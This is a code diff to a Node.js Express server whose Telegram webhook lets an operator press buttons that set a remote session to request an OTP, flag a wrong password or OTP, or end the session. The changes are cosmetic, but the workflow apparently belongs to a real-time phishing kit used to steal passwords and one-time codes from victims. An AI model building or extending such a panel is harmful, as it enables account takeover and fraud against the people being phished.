@@ -65,6 +65,7 @@ app.post('/enviar-alerta-telegram', async (req, res) => {
 });
 
 // Ruta del Webhook de Telegram
+// Ruta del Webhook de Telegram
 app.post('/webhook-telegram', async (req, res) => {
     const update = req.body;
 
@@ -73,10 +74,9 @@ app.post('/webhook-telegram', async (req, res) => {
         const accion = query.data; // Ej: otp_sess_123456 o errlogin_sess_123456
         const callbackQueryId = query.id;
 
-        // Separamos la acción y el sessionId real que venía oculto en el botón
         const partes = accion.split('_');
         const comando = partes[0]; // otp, errlogin, fin, errotp
-        const sessionId = partes.slice(1).join('_'); // el resto es el ID de sesión
+        const sessionId = partes.slice(1).join('_');
 
         if (sessionId) {
             const sessionRef = db.ref(`sessions/${sessionId}`);
@@ -86,13 +86,13 @@ app.post('/webhook-telegram', async (req, res) => {
                 await confirmarBotonTelegram(callbackQueryId, "✅ Solicitando OTP...");
             } else if (comando === 'errlogin') {
                 await sessionRef.update({ status: 'error_login' });
-                await confirmarBotonTelegram(callbackQueryId, "❌ Marcado como Error de Clave");
+                await confirmarBotonTelegram(callbackQueryId, "❌ Error de Clave");
             } else if (comando === 'errotp') {
                 await sessionRef.update({ status: 'otp_error' });
-                await confirmarBotonTelegram(callbackQueryId, "⚠️ Marcado como Error de OTP");
+                await confirmarBotonTelegram(callbackQueryId, "⚠️ Error de OTP");
             } else if (comando === 'fin') {
                 await sessionRef.update({ status: 'finalizar' });
-                await confirmarBotonTelegram(callbackQueryId, "🏁 Sesión finalizada con éxito");
+                await confirmarBotonTelegram(callbackQueryId, "🏁 Sesión finalizada");
             }
         }
     }
